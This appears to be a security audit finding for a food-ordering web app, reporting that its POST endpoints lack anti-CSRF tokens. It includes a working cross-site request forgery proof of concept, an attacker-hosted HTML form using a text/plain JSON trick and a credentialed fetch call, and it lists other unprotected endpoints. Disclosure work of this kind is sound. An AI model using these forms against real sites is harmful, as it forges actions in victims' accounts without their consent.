# M1 — CSRF: Cross-Origin Order Placement (V12)

**Severity:** Medium  
**CWE:** CWE-352 | **OWASP:** A01:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-012-v12-csrf-orders.md`

## Summary

`POST /api/orders` and every other state-changing endpoint check session presence but no anti-CSRF token. Combined with CORS echo + credentials (H13), cross-origin attacker pages can drive victim-side state changes.

## PoC

```html
<!-- On attacker.com while victim is logged in -->
<form id="f" action="http://localhost:4443/api/orders" method="POST" enctype="text/plain">
  <input name='{"items":[{"menu_item_id":1,"quantity":5}],"note":"","x":"' value='"}'>
</form>
<script>document.getElementById('f').submit();</script>
```

Or via `fetch`:

```javascript
fetch('http://localhost:4443/api/orders', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ items: [{ menu_item_id: 1, quantity: 5 }], note: '' })
});
```

Result: order placed in victim's account.

## Pattern Note

V12 is the canonical example but the same pattern affects every POST endpoint: `/api/reviews`, `/api/user/update`, `/api/cart/restore`, `/api/import-menu`, `/api/kitchen/dispatch`, `/api/kitchen/inventory/adjust`, `/api/admin/menu/upload-image`, `/register`, `/login`, `/logout`. None of them check any anti-CSRF token.
